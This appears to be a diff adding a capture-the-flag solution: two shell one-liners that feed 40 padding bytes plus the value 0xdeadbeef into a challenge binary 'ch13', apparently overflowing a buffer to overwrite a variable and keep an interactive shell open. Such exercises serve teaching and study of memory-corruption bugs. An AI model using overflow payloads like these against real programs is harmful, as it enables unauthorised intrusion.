@@ -1,0 +1,5 @@
+(python -c 'print "a" * 40 + "\xef\xbe\xad\xde"'; cat) | ./ch13
+
+or
+
+cat <(python -c 'print "a" * 40 + "\xef\xbe\xad\xde"') - | ./ch13
